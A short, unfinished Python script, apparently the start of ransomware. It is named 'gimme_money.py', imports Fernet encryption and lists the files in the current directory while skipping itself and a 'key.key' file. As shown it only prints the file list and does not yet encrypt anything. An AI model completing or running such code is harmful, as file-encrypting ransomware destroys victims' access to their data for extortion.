print("Under Construction...")
import os
from cryptography.fernet import Fernet

files= []

for file in os.listdir():
    if file == 'gimme_money.py' or file == 'key.key':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)